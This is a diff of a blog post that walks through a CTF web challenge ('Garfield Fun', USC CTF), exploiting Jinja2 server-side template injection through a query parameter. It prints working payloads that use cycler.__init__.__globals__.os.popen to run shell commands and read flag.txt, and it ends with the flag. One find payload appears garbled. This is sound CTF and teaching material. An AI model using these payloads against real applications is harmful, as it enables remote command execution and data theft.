@@ -1,6 +1,6 @@
 ### Garfield Fun – Server Side Template Injection (SSTI) Exploitation
  
----
+--
 title: Garfield Fun – Server Side Template Injection (SSTI) Exploitation
 description: Garfield Fun SSTI walkthrough
 categories: [Web][USC CTF]
@@ -95,13 +95,11 @@ media_subpath: /assets/img/_posts/garfield-ssti
   
     Payload:
      {% raw %}
-     ```bash
        /mylabs?word_5={{7*7}}
       {% endraw %}
  ![SSTI_Confirmed](Garfield_1.png)
    
      {% raw %}
-     ```bash
      Output: Observe the 49 in the image above.
       {% endraw %}
   This confirms that SSTI exists.
@@ -110,7 +108,6 @@ media_subpath: /assets/img/_posts/garfield-ssti
 ### Exploring the Environment
     Payload:
      {% raw %}
-     ```bash
        /mylabs?word_5={{config}}
       {% endraw %}
  
@@ -123,7 +120,6 @@ media_subpath: /assets/img/_posts/garfield-ssti
 ### Listing Files
     Payload:
     {% raw %}
-     ```bash
     /mylabs?word_5={{cycler.__init__.__globals__.os.popen('ls -la').read()}}
      {% endraw %}
  ![ls output](Garfield_3.png)
@@ -133,7 +129,6 @@ media_subpath: /assets/img/_posts/garfield-ssti
 ### Searching for the Flag
     Payload:
     {% raw %}
-     ```bash
     /mylabs?word_5={{cycler.__init__.__globals__.os.popen(find.-maxdepth-type).read()}}
     {% endraw %}
  ![find output](Garfield_4.png)
@@ -145,7 +140,6 @@ media_subpath: /assets/img/_posts/garfield-ssti
 ### Reading the Flag
      Payload:
      {% raw %}
-     ```bash
        /mylabs?word_5={{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}
       {% endraw %}
  ![flag output](Garfield_5.png)
@@ -154,7 +148,6 @@ media_subpath: /assets/img/_posts/garfield-ssti
 
 ### Flag
     {% raw %}
-     ```bash
     uscctf{ssti_rules_mwahaha}
     {% endraw %}
  ---
